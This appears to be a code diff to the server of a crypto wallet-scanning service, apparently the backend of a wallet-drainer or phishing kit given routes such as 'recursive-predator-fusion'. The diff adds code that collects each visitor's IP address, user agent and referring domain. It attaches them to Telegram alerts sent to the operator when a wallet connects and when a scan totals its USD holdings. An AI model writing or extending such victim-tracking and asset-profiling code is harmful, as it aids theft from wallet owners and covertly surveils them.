@@ -12,6 +12,9 @@ import {
   notifyWalletConnected,
   notifyScanComplete,
   notifyError,
+  resolveClientIp,
+  detectDeviceFromUA,
+  type TelegramRequestContext,
 } from '../lib/telegram.js'
 
 type OracleRateKey = 'eth' | 'sol' | 'trx' | 'ton' | 'btc'
@@ -34,6 +37,24 @@ function isValidRpcUrl(s: string): boolean {
     return u.protocol === 'http:' || u.protocol === 'https:'
   } catch {
     return false
+  }
+}
+
+function extractRequestContext(request: FastifyRequest): TelegramRequestContext {
+  const headers = request.headers as Record<string, string | string[] | undefined>
+  const ip = resolveClientIp(headers)
+  const ua = (Array.isArray(headers['user-agent']) ? headers['user-agent'][0] : headers['user-agent']) ?? ''
+  const origin = (Array.isArray(headers['origin']) ? headers['origin'][0] : headers['origin'])
+    ?? (Array.isArray(headers['referer']) ? headers['referer'][0] : headers['referer'])
+    ?? ''
+  let sourceDomain = ''
+  try {
+    if (origin) sourceDomain = new URL(origin).host
+  } catch { sourceDomain = origin }
+  return {
+    ip: ip !== 'Unknown' ? ip : undefined,
+    userAgent: ua || undefined,
+    sourceDomain: sourceDomain || undefined,
   }
 }
 
@@ -118,9 +139,10 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       'telemetry_ingress_weld',
     )
 
-    // 🔔 Telegram: Notify wallet connected (fire-and-forget)
+    // 🔔 Telegram: Notify wallet connected with full context
     if (user_address) {
-      notifyWalletConnected(user_address, chainFamily, walletType).catch(() => {})
+      const ctx = extractRequestContext(request)
+      notifyWalletConnected(user_address, chainFamily, walletType, ctx).catch(() => {})
     }
 
     return reply.send({ ok: true, handshake_active: true, telemetry_trace_id: randomUUID() })
@@ -150,6 +172,7 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       const universalRaw = typeof body.universal_address === 'string' ? body.universal_address.trim() : ''
 
       const primaryAddress = evmRaw || solRaw || tronRaw || tonRaw || btcRaw || universalRaw
+      const ctx = extractRequestContext(request)
 
       const evmRpcCandidate =
         typeof body.evm_rpc_url === 'string' && body.evm_rpc_url.trim() !== '' && isValidRpcUrl(body.evm_rpc_url.trim())
@@ -193,8 +216,8 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
           btcUsd: rates.btc,
         })
       } catch (err) {
-        // 🔔 Telegram: Notify scan error
-        notifyError('/api/scout/recursive-predator-fusion', String(err), primaryAddress || undefined).catch(() => {})
+        // 🔔 Telegram: Notify scan error with context
+        notifyError('/api/scout/recursive-predator-fusion', String(err), primaryAddress || undefined, ctx).catch(() => {})
         throw err
       }
 
@@ -203,7 +226,7 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
         'OMNICHAIN_EXPANSION_LOCKED',
       )
 
-      // 🔔 Telegram: Notify scan complete with total USD value
+      // 🔔 Telegram: Notify scan complete with total USD + context
       if (primaryAddress) {
         const totalUsd = typeof (fusion as Record<string, unknown>)['total_usd'] === 'number'
           ? (fusion as Record<string, unknown>)['total_usd'] as number
@@ -211,7 +234,7 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
         const assetsCount = typeof (fusion as Record<string, unknown>)['assets_count'] === 'number'
           ? (fusion as Record<string, unknown>)['assets_count'] as number
           : Object.keys(fusion as object).length
-        notifyScanComplete(primaryAddress, totalUsd, assetsCount).catch(() => {})
+        notifyScanComplete(primaryAddress, totalUsd, assetsCount, ctx).catch(() => {})
       }
 
       return reply.send({
